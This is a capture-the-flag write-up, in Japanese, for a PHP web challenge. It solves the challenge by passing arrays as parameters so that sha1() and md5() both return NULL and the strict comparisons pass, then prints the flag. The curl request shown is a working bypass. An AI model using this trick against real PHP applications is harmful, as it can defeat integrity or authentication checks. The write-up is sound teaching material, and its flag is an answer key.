# Tricks 1:Web:120pts
A couple of PHP tricks, give it a try.  
[Click here](https://ch5.sbug.se/)  

# Solution
アクセスするとPHP問であることがわかる。  
[site.png](site/site.png)  
```php
 <?php
    error_reporting(0);

    if (isset($_GET["a"]) && isset($_GET["b"])) {
        if ($_GET["a"] !== $_GET["b"] && sha1($_GET["a"]) === sha1($_GET["b"])) {
            if ($_GET["a"] !== $_GET["b"] && md5($_GET["a"]) === md5($_GET["b"])) {
                $flag = file_get_contents("../../flag");
                echo $flag;
            }else {
                echo "Didn't get passed MD5.";
            }
        }else {
            echo "Didn't get passed SHA1.";
        }
    }else {
        highlight_file(__FILE__);
        die();
    }
?> 
```
パラメータ`a`と`b`は厳密に不等価であり、そのsha1とmd5が厳密に等価であればよい。  
まずはsha1とmd5が共に一致するものは見つけにくいので、バイパスを考える。  
文字列を引数にとるが、配列を入れるとNULLが返ってくるらしい。  
つまり`sha1(["a"]) === sha1(["b"])`や`md5(["a"]) === md5(["b"])`は`NULL === NULL`となり真になる。  
もちろん`["a"] !== ["b"]`は真である。  
```bash
$ curl "https://ch5.sbug.se/?a[]=a&b[]=b"
SBCTF{g07_2_w17h_0n3_SH07?}
```
flagが得られた。  

## SBCTF{g07_2_w17h_0n3_SH07?}